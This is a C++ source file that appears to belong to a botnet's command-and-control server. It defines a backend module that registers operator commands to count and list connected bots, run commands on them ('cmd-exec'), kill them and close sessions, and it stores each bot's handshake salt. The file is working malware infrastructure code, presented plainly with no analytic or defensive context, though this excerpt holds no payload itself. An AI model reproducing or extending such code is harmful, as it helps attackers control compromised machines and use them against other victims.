#include "zca/modules/basecmd/back/botcount_cmd_task.h"
#include "zca/modules/basecmd/back/botlist_cmd_task.h"
#include "zca/modules/basecmd/back/kill_cmd_task.h"
#include "zca/modules/basecmd/back/cmdexec_cmd_task.h"

#include "co/xlog/xlog.h"

using namespace std;
using namespace co;
using namespace netshell;
using namespace engine;

namespace modules {
namespace basecmd {
namespace back {

BasecmdBackendModule::BasecmdBackendModule()
{
  SET_DEBUG_TAG(*this, "BasecmdBackendModule");
  disp_table_.AddCommand("bot-count", co::bind(&BasecmdBackendModule::DispatchBotcountCmd, this, _1, _2, _3, _4));
  disp_table_.AddCommand("bot-list", co::bind(&BasecmdBackendModule::DispatchBotlistCmd, this, _1, _2, _3, _4));
  disp_table_.AddCommand("cmd-exec", co::bind(&BasecmdBackendModule::DispatchCmdexecCmd, this, _1, _2, _3, _4));
  disp_table_.AddCommand("kill", co::bind(&BasecmdBackendModule::DispatchKillCmd, this, _1, _2, _3, _4));
  disp_table_.AddCommand("exit", co::bind(&BasecmdBackendModule::DispatchExitCmd, this, _1, _2, _3, _4));
}

void BasecmdBackendModule::OnSessionCreated(EngineSessionApi&,
                                            Uptr<SessionModuleData>&) {
  // Allocate data for module in admin session
}

void BasecmdBackendModule::RegisterBotProperties(
  core::back::BotPropertyGroupRegistrator& reg)
{
  DCHECK(AddedToEngine());
  cmdinfo_prop_group_ = make_unique<CmdinfoPropertyGroup>(
    GetLocalApiAs<core::back::BackendLocalApi>(),
    GetGlobalApiAs<core::back::BackendGlobalApi>());

  reg.RegisterBotPropertyGroup(*cmdinfo_prop_group_.get());
}

Uptr<core::back::BackendBotModuleData> BasecmdBackendModule::CreateBotModuleData()
{
  DCHECK(AddedToEngine());
  // Allocate data for bot
  auto new_data(make_unique<BasecmdBotModuleData>());
  new_data->GetCmdInfoInterlockedHolder().StoreData(CmdInfo());
  return std::move(new_data);
}

// IMPORTANT. Basecmd module has access to detail-level opaque handshake data.
// We save the initial salt here.
void BasecmdBackendModule::OnBotHandshake(Shptr<cc::ICcBot> bot)
{
  BasecmdBotModuleData* bmdata = GetLocalApiAs<core::back::BackendLocalApi>()
    .GetBotModuleDataAs<BasecmdBotModuleData>(*bot.get());
  DCHECK(bmdata != nullptr);

  const string& salt = bot->GetReadonlyData().GetHandshakeData()->GetOpaqueData();

  bmdata->StoreSalt(salt);
}

// Command dispatchers

void BasecmdBackendModule::DispatchBotcountCmd(DispatchContext& disp_context,
  DispatchCmdData&,
  Shptr<Strand> strand,
  Shptr<DispatchCmdTask>& new_task)
{
  // Ignore |disp_context| and |disp_data|, because we're not dispatching cmd now,
  // we are returning a new task. These variables will be passed to the task automatically.
  new_task = make_shared<BotcountCmdTask>(strand);
}

void BasecmdBackendModule::DispatchBotlistCmd(DispatchContext& disp_context,
  DispatchCmdData&,
  Shptr<Strand> strand,
  Shptr<DispatchCmdTask>& new_task)
{
  new_task = make_shared<BotlistCmdTask>(strand);
}

void BasecmdBackendModule::DispatchCmdexecCmd(DispatchContext& disp_context,
  DispatchCmdData&,
  Shptr<Strand> strand,
  Shptr<DispatchCmdTask>& new_task)
{
  new_task = make_shared<CmdexecCmdTask>(strand);

  SET_DEBUG_TAG(*new_task, "basecmd.CmdexecCmdTask");
}

void BasecmdBackendModule::DispatchKillCmd(DispatchContext& disp_context,
  DispatchCmdData&,
  Shptr<Strand> strand,
  Shptr<DispatchCmdTask>& new_task)
{
  new_task = make_shared<KillCmdTask>(strand);

  SET_DEBUG_TAG(*new_task, "basecmd.KillCmdTask");
}

void BasecmdBackendModule::DispatchExitCmd(DispatchContext& disp_context,
  DispatchCmdData&,
  Shptr<Strand> strand,
  Shptr<DispatchCmdTask>&)
{
  auto& sessapi(disp_context.GetSessionApi());
  syslog(_DBG) << "Session " << sessapi.GetSessionInfo().GetSessionId() << " sent `exit` cmd, closing it\n";
  sessapi.KillSession();
}

}}}

